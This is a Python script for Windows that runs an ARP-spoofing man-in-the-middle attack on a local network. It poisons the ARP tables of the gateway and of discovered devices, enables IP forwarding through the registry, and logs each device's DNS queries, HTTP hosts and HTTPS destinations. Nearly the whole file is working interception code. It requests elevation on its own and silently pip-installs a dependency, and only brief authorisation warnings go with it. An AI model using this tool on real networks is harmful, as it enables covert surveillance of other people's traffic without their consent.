#!/usr/bin/env python3
"""
Windows Network Traffic Monitor - Website Detection with ARP Spoofing

This script uses packet capture and ARP spoofing to monitor network traffic 
and extract website information from HTTP, HTTPS, and DNS packets from other devices.
It requires administrator privileges to run.

WARNING: Use only on networks you own or have explicit permission to monitor.
ARP spoofing may violate laws, network policies, and user privacy if used without authorization.
"""

import subprocess
import re
import argparse
import signal
import sys
import time
import threading
import ipaddress
import netifaces
import os
import winreg
from datetime import datetime
from collections import defaultdict
from scapy.all import ARP, Ether, srp, send, conf, get_if_hwaddr, sniff, IP, UDP, TCP, DNS, DNSQR


def is_admin():
    """Check if the script is running with administrator privileges"""
    try:
        return os.getuid() == 0
    except AttributeError:
        # If we're on Windows
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False


def enable_ip_forwarding_windows():
    """Enable IP forwarding on Windows"""
    try:
        # Open registry key
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
            0, 
            winreg.KEY_ALL_ACCESS
        )
        
        # Backup original value
        try:
            original_value, _ = winreg.QueryValueEx(key, "IPEnableRouter")
        except FileNotFoundError:
            original_value = 0
            
        # Set IP forwarding to enabled (1)
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        
        # Apply changes using netsh
        subprocess.run(
            ["netsh", "interface", "ip", "set", "global", "forwarding=enabled"],
            check=True,
            capture_output=True
        )
        
        print("Enabled IP forwarding on Windows")
        return original_value
    except Exception as e:
        print(f"Error enabling IP forwarding: {e}")
        print("You may need to manually enable IP forwarding:")
        print("  1. Open Registry Editor")
        print("  2. Navigate to HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters")
        print("  3. Set IPEnableRouter to 1")
        print("  4. Run 'netsh interface ip set global forwarding=enabled' as admin")
        return None


def disable_ip_forwarding_windows(original_value=0):
    """Disable IP forwarding on Windows"""
    try:
        # Open registry key
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
            0, 
            winreg.KEY_ALL_ACCESS
        )
        
        # Restore original value
        winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, original_value)
        winreg.CloseKey(key)
        
        # Apply changes using netsh
        subprocess.run(
            ["netsh", "interface", "ip", "set", "global", "forwarding=disabled"],
            check=True,
            capture_output=True
        )
        
        print("Disabled IP forwarding on Windows")
    except Exception as e:
        print(f"Error disabling IP forwarding: {e}")


class ARPSpoofer:
    """Class to handle ARP spoofing to redirect traffic through this device"""
    def __init__(self, interface, gateway_ip, target_ips=None, verbose=False):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.target_ips = target_ips  # List of IPs to spoof, None means all devices
        self.verbose = verbose
        self.running = False
        self.thread = None
        self.original_forwarding_value = None
        
        # Get MAC address of the interface
        try:
            self.my_mac = get_if_hwaddr(interface)
        except Exception as e:
            print(f"Error getting MAC address for interface {interface}: {e}")
            print("Check that the interface name is correct.")
            print("Use --list-interfaces to see available interfaces.")
            raise ValueError(f"Unable to get MAC address for interface: {interface}")
        
    def get_mac(self, ip):
        """Get the MAC address of an IP"""
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/arp_request
        
        try:
            answered, _ = srp(packet, timeout=2, verbose=0, iface=self.interface)
            if answered:
                return answered[0][1].hwsrc
        except Exception as e:
            if self.verbose:
                print(f"Error getting MAC address for {ip}: {e}")
        return None
        
    def spoof(self, target_ip, spoof_ip):
        """Spoof ARP tables of target to make it think we're the spoof_ip"""
        target_mac = self.get_mac(target_ip)
        if not target_mac:
            if self.verbose:
                print(f"Could not get MAC address for {target_ip}")
            return
            
        # Create ARP packet to spoof target
        # op=2 means ARP reply
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op=2)
        
        try:
            send(arp_response, verbose=0, iface=self.interface)
            if self.verbose:
                print(f"Sent to {target_ip}: {spoof_ip} is at {self.my_mac}")
        except Exception as e:
            if self.verbose:
                print(f"Error sending ARP packet: {e}")
    
    def restore(self, target_ip, source_ip):
        """Restore normal ARP tables"""
        target_mac = self.get_mac(target_ip)
        source_mac = self.get_mac(source_ip)
        
        if not target_mac or not source_mac:
            return
            
        # Create ARP packet to restore legitimate ARP entry
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac, op=2)
        
        try:
            # Send it 5 times to make sure it takes effect
            send(arp_response, verbose=0, count=5, iface=self.interface)
            if self.verbose:
                print(f"Restored ARP tables for {target_ip}")
        except Exception as e:
            if self.verbose:
                print(f"Error restoring ARP tables: {e}")
    
    def discover_network_devices(self):
        """Discover devices on the network to spoof"""
        if self.target_ips:
            return self.target_ips
            
        # Get network details from interface
        addrs = netifaces.ifaddresses(self.interface)
        if netifaces.AF_INET in addrs:
            ip_info = addrs[netifaces.AF_INET][0]
            ip_address = ip_info['addr']
            netmask = ip_info['netmask']
            
            # Calculate network range
            network = ipaddress.IPv4Network(f"{ip_address}/{netmask}", strict=False)
            
            print(f"Scanning network {network}...")
            
            # Create ARP request for all IPs in range
            alive_devices = []
            arp = ARP(pdst=str(network))
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            try:
                result = srp(packet, timeout=3, verbose=0, iface=self.interface)[0]
                
                for sent, received in result:
                    # Don't include our IP or the gateway
                    if received.psrc != ip_address and received.psrc != self.gateway_ip:
                        alive_devices.append(received.psrc)
                        print(f"Discovered device: {received.psrc} ({received.hwsrc})")
            except Exception as e:
                print(f"Error scanning network: {e}")
                
            return alive_devices
        
        return []
    
    def _spoof_thread(self):
        """Thread function to continuously send spoofed ARP packets"""
        # Discover network devices if not specified
        if not self.target_ips:
            self.target_ips = self.discover_network_devices()
            
        if not self.target_ips:
            print("No target IPs discovered or specified. Exiting.")
            self.running = False
            return
            
        print(f"Starting ARP spoofing for {len(self.target_ips)} devices...")
        
        # Enable IP forwarding on Windows
        self.original_forwarding_value = enable_ip_forwarding_windows()
        
        try:
            while self.running:
                # For each target, spoof both directions
                for target_ip in self.target_ips:
                    # Tell target we are the gateway
                    self.spoof(target_ip, self.gateway_ip)
                    # Tell gateway we are the target
                    self.spoof(self.gateway_ip, target_ip)
                
                # Sleep to avoid flooding the network
                time.sleep(2)
        except Exception as e:
            print(f"Error in ARP spoofing: {e}")
        finally:
            self.restore_network()
            
    def start(self):
        """Start the ARP spoofing"""
        if self.running:
            return
            
        self.running = True
        self.thread = threading.Thread(target=self._spoof_thread)
        self.thread.daemon = True
        self.thread.start()
        
    def stop(self):
        """Stop the ARP spoofing and restore the network"""
        if not self.running:
            return
            
        self.running = False
        if self.thread:
            self.thread.join(timeout=5)
            
        self.restore_network()
        
    def restore_network(self):
        """Restore all ARP tables to normal"""
        print("Restoring ARP tables...")
        if self.target_ips:
            for target_ip in self.target_ips:
                self.restore(target_ip, self.gateway_ip)
                self.restore(self.gateway_ip, target_ip)
                
        # Disable IP forwarding
        if self.original_forwarding_value is not None:
            disable_ip_forwarding_windows(self.original_forwarding_value)


class NetworkMonitor:
    def __init__(self, interface=None, duration=None, output_file=None, dns_only=False, 
                 enable_spoofing=False, gateway_ip=None, target_ips=None, verbose=False):
        self.interface = interface
        self.duration = duration
        self.output_file = output_file
        self.dns_only = dns_only
        self.websites = defaultdict(set)
        self.running = False
        self.start_time = None
        
        # ARP spoofing related
        self.enable_spoofing = enable_spoofing
        self.gateway_ip = gateway_ip
        self.target_ips = target_ips
        self.arp_spoofer = None
        self.verbose = verbose
        
        # Packet capture thread
        self.sniff_thread = None
        
    def packet_callback(self, packet):
        """Process a packet to extract website information"""
        try:
            # Check if we should stop based on duration
            if self.duration and time.time() - self.start_time > self.duration:
                self.running = False
                return
            
            # Extract domain from DNS query
            if packet.haslayer(DNSQR) and packet.haslayer(UDP) and packet.haslayer(IP):
                domain = packet[DNSQR].qname.decode('utf-8').rstrip('.')
                source_ip = packet[IP].src
                self.websites[source_ip].add(f"DNS: {domain}")
                print(f"DNS query from {source_ip}: {domain}")
                
            # Extract domain from HTTP/HTTPS
            if not self.dns_only and packet.haslayer(TCP) and packet.haslayer(IP):
                # HTTP (port 80)
                if packet[TCP].dport == 80 or packet[TCP].sport == 80:
                    # Try to extract Host header from payload
                    if packet.haslayer('Raw'):
                        payload = packet['Raw'].load.decode('utf-8', errors='ignore')
                        host_match = re.search(r'Host: ([a-zA-Z0-9.-]+)', payload)
                        if host_match:
                            domain = host_match.group(1)
                            source_ip = packet[IP].src
                            self.websites[source_ip].add(f"HTTP: {domain}")
                            print(f"HTTP request from {source_ip}: {domain}")
                
                # HTTPS (port 443) - SNI extraction is more complex and may require specialized TLS parsing
                # Basic port-based detection as a fallback
                if packet[TCP].dport == 443:
                    source_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    # We just note the connection, without the specific domain
                    self.websites[source_ip].add(f"HTTPS connection to {dst_ip}")
                    
        except Exception as e:
            if self.verbose:
                print(f"Error processing packet: {e}")
    
    def list_interfaces():
        """List available network interfaces"""
        interfaces = []
        
        # Get friendly names for Windows interfaces
        try:
            from scapy.arch.windows import get_windows_if_list
            if_list = get_windows_if_list()
            
            print("Available network interfaces:")
            for i, interface in enumerate(if_list):
                print(f"{i+1}. Name: {interface['name']}")
                print(f"   Description: {interface['description']}")
                print(f"   IP: {interface.get('ips', ['Unknown'])[0]}")
                print(f"   MAC: {interface.get('mac', 'Unknown')}")
                print()
                
            return if_list
        except Exception as e:
            print(f"Error listing interfaces: {e}")
            return []
    
    def start_capture(self):
        """Start capturing packets using scapy's sniff"""
        # Set up ARP spoofing if enabled
        if self.enable_spoofing:
            # Ensure we have gateway IP
            if not self.gateway_ip:
                try:
                    # Try to determine gateway automatically
                    gws = netifaces.gateways()
                    self.gateway_ip = gws['default'][netifaces.AF_INET][0]
                    print(f"Automatically detected gateway IP: {self.gateway_ip}")
                except:
                    print("Error: Gateway IP could not be determined automatically.")
                    print("Please specify gateway IP with --gateway option.")
                    return
                    
            # Create and start ARP spoofer
            try:
                self.arp_spoofer = ARPSpoofer(
                    interface=self.interface,
                    gateway_ip=self.gateway_ip,
                    target_ips=self.target_ips,
                    verbose=self.verbose
                )
                self.arp_spoofer.start()
                # Give some time for ARP spoofing to take effect
                print("Waiting for ARP spoofing to take effect...")
                time.sleep(5)
            except Exception as e:
                print(f"Error setting up ARP spoofing: {e}")
                return
        
        # Set up filter for scapy sniff
        filter_str = "port 53"  # DNS
        if not self.dns_only:
            filter_str = "port 53 or port 80 or port 443"  # DNS, HTTP, HTTPS
            
        print(f"Starting packet capture with filter: {filter_str}")
        
        # Start packet sniffing in a separate thread
        self.running = True
        self.start_time = time.time()
        
        try:
            # Start sniffing in the current thread
            sniff(
                filter=filter_str,
                prn=self.packet_callback,
                store=0,
                iface=self.interface,
                stop_filter=lambda p: not self.running
            )
        except KeyboardInterrupt:
            print("\nCapture interrupted by user.")
        except Exception as e:
            print(f"Error during packet capture: {e}")
        finally:
            self.stop_capture()
            self.display_results()
    
    def stop_capture(self):
        """Stop packet capture and ARP spoofing"""
        self.running = False
            
        # Stop ARP spoofing if enabled
        if self.arp_spoofer:
            print("Stopping ARP spoofing and restoring network...")
            self.arp_spoofer.stop()
            
    def display_results(self):
        """Display and optionally save the captured results"""
        print("\n" + "="*50)
        print(f"Results - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("="*50)
        
        if not self.websites:
            print("No website activity detected.")
            return
            
        for ip, domains in self.websites.items():
            print(f"\nDevice IP: {ip}")
            for domain in sorted(domains):
                print(f"  - {domain}")
                
        # Save to file if specified
        if self.output_file:
            with open(self.output_file, 'w') as f:
                f.write(f"Network Traffic Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                for ip, domains in self.websites.items():
                    f.write(f"Device IP: {ip}\n")
                    for domain in sorted(domains):
                        f.write(f"  - {domain}\n")
                    f.write("\n")
            print(f"\nResults saved to {self.output_file}")


def validate_ip_list(ip_list):
    """Validate a list of IP addresses"""
    if not ip_list:
        return None
        
    valid_ips = []
    for ip in ip_list:
        try:
            ipaddress.IPv4Address(ip)
            valid_ips.append(ip)
        except ValueError:
            print(f"Invalid IP address: {ip}")
    
    return valid_ips if valid_ips else None


def list_interfaces():
    """List available network interfaces"""
    try:
        from scapy.arch.windows import get_windows_if_list
        if_list = get_windows_if_list()
        
        print("Available network interfaces:")
        for i, interface in enumerate(if_list):
            print(f"{i+1}. Name: {interface['name']}")
            print(f"   Description: {interface['description']}")
            print(f"   IP: {interface.get('ips', ['Unknown'])[0] if interface.get('ips') else 'Unknown'}")
            print(f"   MAC: {interface.get('mac', 'Unknown')}")
            print()
            
        # Also show network information for each interface from netifaces
        print("\nAdditional network information:")
        for iface in netifaces.interfaces():
            print(f"\nInterface: {iface}")
            try:
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        print(f"  IP address: {addr.get('addr', 'N/A')}")
                        print(f"  Netmask: {addr.get('netmask', 'N/A')}")
            except Exception as e:
                print(f"  Error getting info: {e}")
                
    except Exception as e:
        print(f"Error listing interfaces: {e}")


def main():
    # Check for administrator privileges and re-run with elevation if needed
    if not is_admin():
        print("This script requires administrator privileges. Requesting elevation...")
        
        # Re-run the script with admin rights
        import sys
        script = sys.argv[0]
        args = ' '.join(sys.argv[1:])
        
        try:
            # Use ctypes to elevate
            import ctypes
            import win32con
            
            # ShellExecute function to elevate
            ctypes.windll.shell32.ShellExecuteW(
                None,                  # handle to parent
                "runas",               # operation - "runas" for admin
                sys.executable,        # path to executable (python)
                f'"{script}" {args}',  # parameters
                None,                  # directory
                win32con.SW_SHOWNORMAL # show window
            )
            # Exit the non-elevated version
            sys.exit(0)
        except Exception as e:
            print(f"Error elevating privileges: {e}")
            print("Please run as administrator manually.")
            sys.exit(1)
        
    # Set up command line arguments
    parser = argparse.ArgumentParser(description='Monitor network traffic to detect website activity')
    parser.add_argument('-i', '--interface', help='Network interface to monitor (name or index)')
    parser.add_argument('-t', '--time', type=int, help='Duration to capture in seconds')
    parser.add_argument('-o', '--output', help='Output file to save results')
    parser.add_argument('-d', '--dns-only', action='store_true', help='Only monitor DNS traffic')
    parser.add_argument('-l', '--list-interfaces', action='store_true', help='List available network interfaces')
    
    # ARP spoofing options
    parser.add_argument('-s', '--spoof', action='store_true', help='Enable ARP spoofing to monitor other devices')
    parser.add_argument('-g', '--gateway', help='Gateway IP address for ARP spoofing')
    parser.add_argument('-T', '--targets', nargs='+', help='Target IP addresses to monitor (space separated)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # List interfaces if requested
    if args.list_interfaces:
        list_interfaces()
        return
    
    # Check for required arguments
    if not args.interface:
        print("Error: Interface (-i/--interface) must be specified")
        print("Use --list-interfaces to see available interfaces")
        return
        
    # Check if interface is an index and convert to name if needed
    try:
        interface_index = int(args.interface)
        # Get interface name from index
        from scapy.arch.windows import get_windows_if_list
        if_list = get_windows_if_list()
        
        if 1 <= interface_index <= len(if_list):
            args.interface = if_list[interface_index-1]['name']
            print(f"Using interface: {args.interface}")
        else:
            print(f"Error: Interface index {interface_index} is out of range")
            return
    except ValueError:
        # Not an index, use as is
        pass
        
    # Validate target IPs if provided
    target_ips = None
    if args.targets:
        target_ips = validate_ip_list(args.targets)
        
    # Create and start monitor
    monitor = NetworkMonitor(
        interface=args.interface,
        duration=args.time,
        output_file=args.output,
        dns_only=args.dns_only,
        enable_spoofing=args.spoof,
        gateway_ip=args.gateway,
        target_ips=target_ips,
        verbose=args.verbose
    )
    
    # Set up signal handler for graceful exit
    def signal_handler(sig, frame):
        print("\nStopping capture...")
        monitor.stop_capture()
        sys.exit(0)
        
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start monitoring
    if args.spoof:
        print("\n" + "!"*70)
        print("! WARNING: ARP spoofing enabled - use only on networks you own/control !")
        print("! This technique may be illegal if used without proper authorization   !")
        print("!"*70 + "\n")
        time.sleep(2)  # Give user time to read warning
    
    print("Starting network monitoring. Press Ctrl+C to stop.")
    monitor.start_capture()
    
if __name__ == "__main__":
    # Import required libraries for Windows admin functions
    import ctypes
    try:
        # Try to import the win32con module (needed for auto-elevation)
        import win32con
    except ImportError:
        print("Installing required pywin32 module...")
        # Try to install the required module
        try:
            import subprocess
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pywin32"])
            import win32con
        except Exception as e:
            print(f"Error installing pywin32: {e}")
            print("Please install it manually with: pip install pywin32")
            sys.exit(1)
    
    main()